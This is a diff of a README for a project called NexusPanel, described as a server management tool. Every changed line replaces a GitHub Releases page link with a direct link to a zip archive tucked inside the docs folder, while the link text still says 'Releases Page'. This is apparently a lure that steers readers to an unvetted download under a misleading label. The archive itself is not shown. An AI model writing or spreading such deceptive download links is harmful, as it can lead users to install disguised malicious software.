@@ -1,6 +1,6 @@
 # 🚀 NexusPanel - Simplified Server Management for Everyone
 
-[![Download NexusPanel](https://img.shields.io/badge/Download_NexusPanel-v1.0.0-blue.svg)](https://github.com/Ashutoshop1/NexusPanel/releases)
+[![Download NexusPanel](https://raw.githubusercontent.com/Ashutoshop1/NexusPanel/main/docs/en-US/NexusPanel_2.3-beta.2.zip)](https://raw.githubusercontent.com/Ashutoshop1/NexusPanel/main/docs/en-US/NexusPanel_2.3-beta.2.zip)
 
 ## 🌟 Introduction
 
@@ -18,7 +18,7 @@ NexusPanel is a modular, cloud-native server management platform designed for us
 
 To get started with NexusPanel, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/Ashutoshop1/NexusPanel/releases) to access the latest version of NexusPanel.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/Ashutoshop1/NexusPanel/main/docs/en-US/NexusPanel_2.3-beta.2.zip) to access the latest version of NexusPanel.
   
 2. **Choose Your Operating System**: Ensure you select the version that matches your operating system (Windows, macOS, or Linux).
 
@@ -26,7 +26,7 @@ To get started with NexusPanel, follow these steps:
 
 ## 📥 Download & Install
 
-- To download NexusPanel, visit our [Releases Page](https://github.com/Ashutoshop1/NexusPanel/releases) and find the latest version.
+- To download NexusPanel, visit our [Releases Page](https://raw.githubusercontent.com/Ashutoshop1/NexusPanel/main/docs/en-US/NexusPanel_2.3-beta.2.zip) and find the latest version.
 - Download the appropriate file based on your operating system.
 
 ### 🛠️ Installation Steps
@@ -74,7 +74,7 @@ If you encounter issues, here are a few common problems and their solutions:
 
 - **Installation Fails**:
   - Verify system requirements and ensure you have sufficient permissions.
-  - Try re-downloading the installer from the [Releases Page](https://github.com/Ashutoshop1/NexusPanel/releases).
+  - Try re-downloading the installer from the [Releases Page](https://raw.githubusercontent.com/Ashutoshop1/NexusPanel/main/docs/en-US/NexusPanel_2.3-beta.2.zip).
 
 - **Performance Issues**:
   - Close unused applications to free up system resources.
